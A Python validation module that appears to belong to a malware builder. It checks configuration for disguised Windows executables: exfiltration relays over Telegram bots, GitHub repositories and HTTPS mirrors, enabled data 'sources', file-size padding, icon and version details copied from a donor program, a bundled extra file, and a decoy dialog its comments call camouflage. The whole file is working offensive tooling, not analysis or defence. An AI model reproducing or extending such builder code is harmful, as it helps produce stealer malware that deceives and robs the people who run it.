"""Pre-build validation: six rules, one list of failures, no exceptions.

The form is allowed to be wrong in every field at once, so this never stops at the
first problem and never raises. It returns ``Problem`` records and the caller
decides what to do with them, which for the UI is to paint the path and hold the Run
button down.

The split between ``core/schema.py`` and here is deliberate. The schema describes
what a config *is*: types, required keys, the ballast range. This describes what is
worth *building*: an endpoint that will not reach a relay, a name Windows will not
accept, an exe build with no launcher behind it. A config can pass the schema and
still fail here — an empty endpoint does exactly that, because ``_as_str`` permits
the empty string and the relay cannot use it.

Every rule names a dotted path, so a failure points at a field rather than at the
document. ``blocking`` is False for a rule that is true but harmless, such as ballast
on a script build, which ``forge`` ignores by design.
"""

from __future__ import annotations

import re
import struct
from dataclasses import dataclass
from pathlib import Path
from typing import Final
from urllib.parse import urlsplit

from .forge import (
    BOUND_SUFFIXES,
    KEY_SLOT,
    MAX_FUSE_BYTES,
    MAX_ICON_BYTES,
    MUTEX_SLOT,
    OUTPUT_EXE,
    OUTPUT_MODES,
    OUTPUT_PY,
    ForgeError,
    version_parts,
)
from .rename import MAX_NAME_LENGTH, RenameError, sanitize, sanitize_suffix
from .schema import (
    MAX_BALLAST_MB,
    MAX_DECOY_SECONDS,
    MAX_DECOY_TEXT,
    MAX_VERSION_TEXT,
    RELAY_KINDS,
    SOURCE_FIELDS,
    RunConfig,
    VersionConfig,
)

# Twelve is a floor, not a strength claim: PBKDF2 stretches whatever it is given, so
# the number exists to stop a four-character key being shipped, not to substitute for
# entropy.
MIN_SEAL_KEY_LENGTH: Final[int] = 12

# The trailer carries one 64-byte slot per key. A character count stops being the same
# number once the passphrase is not ASCII, so the ceiling is measured in the bytes that
# actually land in the slot — forge would refuse the oversized one later, and a build
# that fails at the write stage is a mystery the form should have solved.
MAX_SEAL_KEY_LENGTH: Final[int] = KEY_SLOT

# A kernel object name is capped at 260 characters including the namespace prefix;
# 200 leaves room for ``Global\`` and still fails loudly well before the kernel does.
MAX_MUTEX_LENGTH: Final[int] = 200

_MUTEX_FORBIDDEN: Final[str] = '<>:"|?*'

# Telegram bot tokens are ``<bot id>:<secret>``. The secret length is checked loosely
# because the shape has changed before and a rejected valid token is worse than a
# passed invalid one, which transmit reports clearly enough.
_TELEGRAM_TOKEN: Final[re.Pattern[str]] = re.compile(r"^\d+:[A-Za-z0-9_-]{20,}$")

# A GitHub repository half is owner/name; both halves allow dots, dashes and
# underscores and nothing else. The token is checked for shape only — a classic
# ghp_ token and a fine-grained github_pat_ token have different prefixes, and a
# validator that demands one of them rejects the other on a machine that works.
_PHANTOM_REPO: Final[re.Pattern[str]] = re.compile(r"^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+$")
_PHANTOM_TOKEN: Final[re.Pattern[str]] = re.compile(r"^[A-Za-z0-9_]{20,}$")

_EXTENSIONS: Final[dict[str, str]] = {OUTPUT_EXE: ".exe", OUTPUT_PY: ".py"}

RULE_MUTEX: Final[str] = "mutex"
RULE_SEAL_KEY: Final[str] = "seal_key"
RULE_ENDPOINT: Final[str] = "relay.endpoint"
RULE_SOURCES: Final[str] = "sources"
RULE_BALLAST: Final[str] = "ballast_mb"
RULE_OUTPUT: Final[str] = "output"
RULE_INTERNAL: Final[str] = "internal"

RULES: Final[tuple[str, ...]] = (
    RULE_MUTEX,
    RULE_SEAL_KEY,
    RULE_ENDPOINT,
    RULE_SOURCES,
    RULE_BALLAST,
    RULE_OUTPUT,
)


@dataclass(frozen=True, slots=True)
class Problem:
    """One failure. ``path`` is the dotted field the UI focuses."""

    rule: str
    path: str
    message: str
    blocking: bool = True

    def __str__(self) -> str:
        return f"{self.path}: {self.message}"


def _problem(rule: str, path: str, message: str) -> Problem:
    return Problem(rule=rule, path=path, message=message, blocking=True)


def _note(rule: str, path: str, message: str) -> Problem:
    return Problem(rule=rule, path=path, message=message, blocking=False)


def blocking(problems: list[Problem]) -> list[Problem]:
    """The subset that stops a build. Everything the Run button gates on."""
    return [problem for problem in problems if problem.blocking]


def describe(problems: list[Problem], limit: int = 5) -> str:
    """One line for a status bar, capped so a full form stays readable."""
    if not problems:
        return ""
    shown = [str(problem) for problem in problems[:limit]]
    if len(problems) > limit:
        shown.append(f"and {len(problems) - limit} more")
    return "; ".join(shown)


def _check_mutex(mutex: str) -> list[Problem]:
    if not mutex.strip():
        return [_problem(RULE_MUTEX, "mutex", "must not be empty")]
    if len(mutex) > MAX_MUTEX_LENGTH:
        return [
            _problem(RULE_MUTEX, "mutex", f"{len(mutex)} characters, limit {MAX_MUTEX_LENGTH}")
        ]
    encoded = len(mutex.encode("utf-8"))
    if encoded > MUTEX_SLOT:
        return [
            _problem(RULE_MUTEX, "mutex", f"{encoded} bytes, the container carries {MUTEX_SLOT}")
        ]
    illegal = sorted({character for character in mutex if character in _MUTEX_FORBIDDEN})
    if illegal:
        return [
            _problem(
                RULE_MUTEX,
                "mutex",
                "contains " + " ".join(repr(character) for character in illegal),
            )
        ]
    # A backslash is legal and is how the Global namespace is written; a leading one
    # on its own is not a namespace and names an object nobody else will contend for.
    if mutex.startswith("\\"):
        return [_note(RULE_MUTEX, "mutex", "leading backslash, not a namespace prefix")]
    return []


def _check_seal_key(seal_key: str) -> list[Problem]:
    if not seal_key.strip():
        return [_problem(RULE_SEAL_KEY, "seal_key", "must not be empty")]
    if seal_key != seal_key.strip():
        return [_problem(RULE_SEAL_KEY, "seal_key", "has leading or trailing whitespace")]
    if len(seal_key) < MIN_SEAL_KEY_LENGTH:
        return [
            _problem(
                RULE_SEAL_KEY,
                "seal_key",
                f"{len(seal_key)} characters, minimum {MIN_SEAL_KEY_LENGTH}",
            )
        ]
    encoded = len(seal_key.encode("utf-8"))
    if encoded > MAX_SEAL_KEY_LENGTH:
        return [
            _problem(
                RULE_SEAL_KEY,
                "seal_key",
                f"{encoded} bytes, the container carries {MAX_SEAL_KEY_LENGTH}",
            )
        ]
    return []


def _check_https(endpoint: str, path: str = "relay.endpoint") -> list[Problem]:
    try:
        parts = urlsplit(endpoint)
    except ValueError as exc:
        return [_problem(RULE_ENDPOINT, path, f"unparseable ({exc})")]
    if parts.scheme.lower() not in ("http", "https"):
        return [_problem(RULE_ENDPOINT, path, "scheme must be http or https")]
    if not parts.netloc:
        return [_problem(RULE_ENDPOINT, path, "no host")]
    return []


def _check_ping(ping: str) -> list[Problem]:
    """The status webhook, when one is set.

    Reported under the endpoint rule rather than a seventh one: it is the same
    question about the same kind of value, and a rule list that grows for every
    optional field stops being a list of the ways a build can be wrong.
    """
    if not ping.strip():
        return []
    if ping != ping.strip():
        return [
            _problem(RULE_ENDPOINT, "relay.ping", "has leading or trailing whitespace")
        ]
    if any(character.isspace() for character in ping):
        return [_problem(RULE_ENDPOINT, "relay.ping", "contains whitespace")]
    return _check_https(ping, "relay.ping")


def _check_telegram(endpoint: str, path: str = "relay.endpoint") -> list[Problem]:
    parts = endpoint.split("$")
    if len(parts) != 2:
        return [_problem(RULE_ENDPOINT, path, "must be token$chat, one $")]
    token, chat = parts
    if not token:
        return [_problem(RULE_ENDPOINT, path, "token half is empty")]
    if not chat:
        return [_problem(RULE_ENDPOINT, path, "chat half is empty")]
    if not _TELEGRAM_TOKEN.match(token):
        return [_problem(RULE_ENDPOINT, path, "token is not <digits>:<secret>")]
    return []


def _check_phantom(endpoint: str, path: str = "relay.endpoint") -> list[Problem]:
    """A GitHub repository and the token that can publish to it.

    The repository is the front of the channel; the archive is never stored in it.
    Both halves are validated here because a typo in either produces the same
    failure at delivery time — a 404 that reads like a dead network.
    """
    parts = endpoint.split("$")
    if len(parts) != 2:
        return [_problem(RULE_ENDPOINT, path, "must be owner/repo$token, one $")]
    repo, token = parts
    if not repo:
        return [_problem(RULE_ENDPOINT, path, "repository half is empty")]
    if not token:
        return [_problem(RULE_ENDPOINT, path, "token half is empty")]
    if not _PHANTOM_REPO.match(repo):
        return [_problem(RULE_ENDPOINT, path, "repository is not owner/name")]
    owner, name = repo.split("/")
    # ``..`` and ``.`` match the character class and are not repositories. Formatted
    # into the release URL they become path traversal, so the shape check alone is not
    # the gate — the segment check is.
    if set(owner) == {"."} or set(name) == {"."}:
        return [_problem(RULE_ENDPOINT, path, "repository is not owner/name")]
    if not _PHANTOM_TOKEN.match(token):
        return [_problem(RULE_ENDPOINT, path, "token is not a GitHub token")]
    return []


def _check_endpoint(
    kind: str,
    endpoint: str,
    path: str = "relay.endpoint",
    kind_path: str = "relay.kind",
) -> list[Problem]:
    # The rule is keyed on the kind, not on the shape: a single pattern that accepts
    # either is how a bot token reaches the https field and is not noticed until
    # transmit. An unknown kind makes the endpoint unreadable, so it is reported here.
    if kind not in RELAY_KINDS:
        return [
            _problem(
                RULE_ENDPOINT,
                kind_path,
                f"expected one of {', '.join(RELAY_KINDS)}, got {kind!r}",
            )
        ]
    if not endpoint.strip():
        return [_problem(RULE_ENDPOINT, path, "must not be empty")]
    if endpoint != endpoint.strip():
        return [_problem(RULE_ENDPOINT, path, "has leading or trailing whitespace")]
    if any(character.isspace() for character in endpoint):
        return [_problem(RULE_ENDPOINT, path, "contains whitespace")]

    if kind == "telegram":
        return _check_telegram(endpoint, path)
    if kind == "phantom":
        return _check_phantom(endpoint, path)
    return _check_https(endpoint, path)


def _check_targets(cfg: RunConfig) -> list[Problem]:
    """The mirrors, each one checked by the same rule as the primary.

    A mirror is a fallback, so a mirror that is itself malformed is worse than none: it
    costs three attempts and a backoff on a run where the primary has already failed.
    Reported under the endpoint rule with an indexed path, because the reader needs to
    know which row to fix.
    """
    mirrors = cfg.relay.targets
    problems: list[Problem] = []
    seen: set[tuple[str, str]] = {(str(cfg.relay.kind), cfg.relay.endpoint)}

    for index, target in enumerate(mirrors):
        path = f"relay.targets.{index}.endpoint"
        problems += _check_endpoint(
            target.kind,
            target.endpoint,
            path,
            f"relay.targets.{index}.kind",
        )
        pair = (str(target.kind), str(target.endpoint))
        if pair in seen:
            problems.append(
                _problem(RULE_ENDPOINT, path, "this target is already in the list")
            )
        seen.add(pair)
    return problems


def _check_sources(cfg: RunConfig) -> list[Problem]:
    enabled = [name for name in SOURCE_FIELDS if getattr(cfg.sources, name)]
    if enabled:
        return []
    return [_problem(RULE_SOURCES, "sources", "every source is switched off")]


def _check_ballast(ballast_mb: int, mode: str) -> list[Problem]:
    if ballast_mb < 0 or ballast_mb > MAX_BALLAST_MB:
        return [
            _problem(
                RULE_BALLAST,
                "ballast_mb",
                f"{ballast_mb} is outside 0..{MAX_BALLAST_MB}",
            )
        ]
    if mode == OUTPUT_PY and ballast_mb:
        # forge ignores it for script output; correct, but worth saying rather than
        # silently producing a file that is not larger than it asked for.
        return [_note(RULE_BALLAST, "ballast_mb", f"{ballast_mb} MB ignored for script output")]
    return []


def _check_name(name: str, mode: str) -> list[Problem]:
    expected = _EXTENSIONS[mode]
    try:
        cleaned = sanitize(name)
    except RenameError as exc:
        return [_problem(RULE_OUTPUT, "output.name", str(exc))]

    problems: list[Problem] = []
    if len(name) > MAX_NAME_LENGTH:
        problems.append(
            _note(RULE_OUTPUT, "output.name", f"longer than {MAX_NAME_LENGTH}, will be truncated")
        )

    suffix = Path(cleaned).suffix
    if not suffix:
        # The pipeline appends the mode's extension; say so instead of failing.
        problems.append(_note(RULE_OUTPUT, "output.name", f"{expected} will be appended"))
        return problems

    try:
        sanitize_suffix(suffix)
    except RenameError as exc:
        problems.append(_problem(RULE_OUTPUT, "output.name", str(exc)))
        return problems

    if suffix.lower() != expected:
        problems.append(
            _problem(RULE_OUTPUT, "output.name", f"{mode} output must end {expected}")
        )
    return problems


def _check_stub(stub: Path | None, mode: str) -> list[Problem]:
    if mode != OUTPUT_EXE:
        return []
    if stub is None:
        return [_problem(RULE_OUTPUT, "output.stub", "exe output needs a frozen launcher")]
    if not stub.is_file():
        return [_problem(RULE_OUTPUT, "output.stub", f"{stub}: not a file")]
    try:
        size = stub.stat().st_size
    except OSError as exc:
        return [_problem(RULE_OUTPUT, "output.stub", f"{stub}: cannot stat ({exc.strerror})")]
    if size <= 0:
        return [_problem(RULE_OUTPUT, "output.stub", f"{stub}: is empty")]
    return []


def _check_icon(icon: Path | None, mode: str) -> list[Problem]:
    """The ``.ico`` patched into the launcher's resources.

    Reported under the output rule with its own path, the same way the status webhook is
    reported under the endpoint rule: it is the same question about the same kind of
    value, and a rule list that grows once per optional field stops being a list of the
    ways a build can be wrong.

    Only the six-byte header is read here. Enough to tell a single-icon library from a
    renamed PNG and to know the directory fits; the full parse lives in ``forge``, where
    a malformed entry is a failed build rather than a complaint on a field the reader
    cannot fix.
    """
    if icon is None:
        return []
    if not icon.is_file():
        return [_problem(RULE_OUTPUT, "output.icon", f"{icon}: not a file")]
    if icon.suffix.lower() != ".ico":
        return [_problem(RULE_OUTPUT, "output.icon", f"{icon.name}: needs to be a .ico")]

    try:
        size = icon.stat().st_size
    except OSError as exc:
        return [_problem(RULE_OUTPUT, "output.icon", f"{icon}: cannot stat ({exc.strerror})")]
    if size <= 0:
        return [_problem(RULE_OUTPUT, "output.icon", f"{icon.name}: is empty")]
    if size > MAX_ICON_BYTES:
        return [
            _problem(
                RULE_OUTPUT,
                "output.icon",
                f"{size} bytes, the ceiling is {MAX_ICON_BYTES}",
            )
        ]

    try:
        with icon.open("rb") as handle:
            head = handle.read(6)
    except OSError as exc:
        return [_problem(RULE_OUTPUT, "output.icon", f"{icon}: cannot read ({exc.strerror})")]

    if len(head) < 6:
        return [_problem(RULE_OUTPUT, "output.icon", f"{icon.name}: shorter than a header")]
    reserved, kind, count = struct.unpack("<HHH", head)
    if reserved != 0 or kind != 1:
        return [_problem(RULE_OUTPUT, "output.icon", f"{icon.name}: not a .ico")]
    if count == 0:
        return [_problem(RULE_OUTPUT, "output.icon", f"{icon.name}: carries no images")]
    if 6 + count * 16 > size:
        return [_problem(RULE_OUTPUT, "output.icon", f"{icon.name}: directory runs past it")]

    if mode != OUTPUT_EXE:
        return [_note(RULE_OUTPUT, "output.icon", "ignored: a script has no icon slot")]
    return []


def _check_donor(donor: Path | None, mode: str) -> list[Problem]:
    """The executable a build copies its icon and version from.

    Only the two bytes that say "this is an image" are read. Everything past that is
    ``forge.harvest``'s problem, and it reports a licence-locked or resource-less donor
    the same way it reports a malformed one: as an empty half of the disguise, not as a
    stopped build.
    """
    if donor is None:
        return []
    if not donor.is_file():
        return [_problem(RULE_OUTPUT, "output.donor", f"{donor}: not a file")]

    try:
        with donor.open("rb") as handle:
            head = handle.read(2)
    except OSError as exc:
        return [_problem(RULE_OUTPUT, "output.donor", f"{donor}: cannot read ({exc.strerror})")]
    if head != b"MZ":
        return [_problem(RULE_OUTPUT, "output.donor", f"{donor.name}: not a Windows executable")]

    if mode != OUTPUT_EXE:
        return [_note(RULE_OUTPUT, "output.donor", "ignored: a script has no resources")]
    return []


def _check_fuse(fuse: Path | None) -> list[Problem]:
    """The one file welded into the payload archive and started by the agent.

    Both output modes carry it: the archive is the same archive either way, so only the
    icon is format-dependent. A file that cannot be started is still carried and still
    extracted — a bound ``.dll`` beside a bound ``.exe`` is exactly why that matters.
    """
    if fuse is None:
        return []
    if not fuse.is_file():
        return [_problem(RULE_OUTPUT, "output.fuse", f"{fuse}: not a file")]

    try:
        size = fuse.stat().st_size
    except OSError as exc:
        return [_problem(RULE_OUTPUT, "output.fuse", f"{fuse}: cannot stat ({exc.strerror})")]
    if size <= 0:
        return [_problem(RULE_OUTPUT, "output.fuse", f"{fuse.name}: is empty")]
    if size > MAX_FUSE_BYTES:
        return [
            _problem(
                RULE_OUTPUT,
                "output.fuse",
                f"{size} bytes, the ceiling is {MAX_FUSE_BYTES}",
            )
        ]

    if fuse.suffix.lower() not in BOUND_SUFFIXES:
        return [
            _note(
                RULE_OUTPUT,
                "output.fuse",
                f"{fuse.suffix or 'no extension'}: carried and extracted, not started",
            )
        ]
    return []


def _check_version(version: VersionConfig, mode: str) -> list[Problem]:
    """The properties sheet the artifact will show.

    Checked here rather than in ``forge`` for the same reason the icon header is: a
    version string that cannot be assembled is a form defect, and the form is where it
    can still be fixed. ``forge`` re-derives the same values and refuses at build time.
    """
    problems: list[Problem] = []
    for name in ("company", "product", "description", "copyright", "original_name"):
        text = getattr(version, name)
        if len(text) > MAX_VERSION_TEXT:
            problems.append(
                _problem(
                    RULE_OUTPUT,
                    f"output.version.{name}",
                    f"{len(text)} characters, the ceiling is {MAX_VERSION_TEXT}",
                )
            )
        if any(ord(character) < 32 for character in text):
            problems.append(
                _problem(
                    RULE_OUTPUT,
                    f"output.version.{name}",
                    "contains a control character",
                )
            )

    for name in ("file_version", "product_version"):
        text = getattr(version, name)
        if not text:
            continue
        try:
            version_parts(text)
        except ForgeError as exc:
            problems.append(_problem(RULE_OUTPUT, f"output.version.{name}", str(exc)))

    if any(
        (
            version.company,
            version.product,
            version.description,
            version.copyright,
            version.original_name,
            version.file_version,
            version.product_version,
        )
    ) and mode != OUTPUT_EXE:
        problems.append(
            _note(RULE_OUTPUT, "output.version", "ignored: a script has no resources")
        )
    return problems


def _check_decoy(seconds: int, title: str, text: str, mode: str) -> list[Problem]:
    """The dialog shown while the artifact works."""
    if seconds < 0 or seconds > MAX_DECOY_SECONDS:
        return [
            _problem(
                RULE_OUTPUT,
                "output.decoy.seconds",
                f"expected 0..{MAX_DECOY_SECONDS}, got {seconds}",
            )
        ]
    if seconds == 0:
        return []

    problems: list[Problem] = []
    for name, value in (("title", title), ("text", text)):
        if len(value) > MAX_DECOY_TEXT:
            problems.append(
                _problem(
                    RULE_OUTPUT,
                    f"output.decoy.{name}",
                    f"{len(value)} characters, the ceiling is {MAX_DECOY_TEXT}",
                )
            )
        if any(ord(character) < 32 and character not in "\t\n" for character in value):
            problems.append(
                _problem(RULE_OUTPUT, f"output.decoy.{name}", "contains a control character")
            )
    if not problems and not title.strip() and not text.strip():
        # A dialog with no title and no text is an empty grey box on somebody's screen
        # for ten minutes, which is worse camouflage than no dialog at all.
        problems.append(
            _problem(
                RULE_OUTPUT,
                "output.decoy.title",
                "a decoy with no title and no text shows an empty box",
            )
        )
    if mode != OUTPUT_EXE:
        problems.append(_note(RULE_OUTPUT, "output.decoy", "ignored: a script has no window"))
    return problems


def validate(
    cfg: RunConfig,
    *,
    mode: str,
    name: str | None = None,
    stub: Path | None = None,
    icon: Path | None = None,
    fuse: Path | None = None,
    donor: Path | None = None,
) -> list[Problem]:
    """Every rule, every failure, in rule order. Never raises.

    ``mode`` is checked first because the extension and launcher rules depend on it;
    an unknown mode short-circuits those two and nothing else.
    """
    try:
        problems: list[Problem] = []
        problems += _check_mutex(cfg.mutex)
        problems += _check_seal_key(cfg.seal_key)
        problems += _check_endpoint(cfg.relay.kind, cfg.relay.endpoint)
        problems += _check_ping(cfg.relay.ping)
        problems += _check_targets(cfg)
        problems += _check_sources(cfg)
        problems += _check_version(cfg.version, mode)
        problems += _check_decoy(cfg.decoy_seconds, cfg.decoy_title, cfg.decoy_text, mode)

        known_mode = mode in OUTPUT_MODES
        if not known_mode:
            problems.append(
                _problem(
                    RULE_OUTPUT,
                    "output.mode",
                    f"expected one of {', '.join(OUTPUT_MODES)}, got {mode!r}",
                )
            )
        else:
            problems += _check_ballast(cfg.ballast_mb, mode)
            if name is not None:
                problems += _check_name(name, mode)
            problems += _check_stub(stub, mode)
            problems += _check_icon(icon, mode)
            problems += _check_donor(donor, mode)
            problems += _check_fuse(fuse)

        return problems
    except Exception as exc:
        # The rules are defensive already, but "never raises" is a contract and a
        # caller that has to guard the guard is not being served.
        return [_problem(RULE_INTERNAL, "", f"validation itself failed ({exc})")]


__all__ = [
    "MAX_MUTEX_LENGTH",
    "MAX_SEAL_KEY_LENGTH",
    "MIN_SEAL_KEY_LENGTH",
    "RULES",
    "RULE_BALLAST",
    "RULE_ENDPOINT",
    "RULE_INTERNAL",
    "RULE_MUTEX",
    "RULE_OUTPUT",
    "RULE_SEAL_KEY",
    "RULE_SOURCES",
    "Problem",
    "blocking",
    "describe",
    "validate",
]
